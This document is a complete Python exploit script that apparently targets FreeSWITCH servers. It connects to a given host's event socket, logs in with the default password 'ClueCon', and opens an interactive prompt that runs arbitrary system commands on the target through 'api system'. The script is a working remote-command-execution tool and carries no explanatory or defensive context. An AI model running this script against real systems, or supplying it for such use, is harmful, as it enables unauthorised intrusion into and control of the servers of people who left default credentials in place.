#!/usr/bin/env python3

import socket,signal,sys,time

def handler(sig,frame):
    print(f"[!] Closing the program...\n")
    s.close()
    exit(1)
signal.signal(signal.SIGINT,handler)

def help():
    print("[!] Error, invalid or inexistent args...")
    print(f"\n usage: {sys.argv[0]} <remote-ip> <remote-port>")
    exit(1)

def getShell(conn,passwd):
    print("[+] Connecting to remote host...")
    try:
        global s
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect(conn)
        s.recv(2048)
        print("[+] Successfully connected :D")
        time.sleep(2)
        print("[+] Spawning shell...")
        s.send(f"auth {passwd}\n\n".encode())
        if "Reply-Text: +OK accepted" in s.recv(2048).decode():
            print("[+] Shell successfully spawned, type \"exit\" to close the connection\n")
            while True:
                cmd=input("cmd>> ").strip()
                if cmd == "exit":
                    break
                s.send(f"api system {cmd}\n\n".encode())
                response=s.recv(8192).decode()
                print(response)
        else:
            print("[!] Failed in the auth process...")
            exit(1)
    except:
        print("[!] Couldnt connect to remote host")
        exit(1)
    s.close()
    return


def main():
    freeswitch_default_pass = "ClueCon"
    if len(sys.argv) != 3:
        help()
    getShell((sys.argv[1],int(sys.argv[2]),),freeswitch_default_pass)
    print(f"[+] Successfully closed connection with remote host\n")


if __name__ == '__main__':
    main()
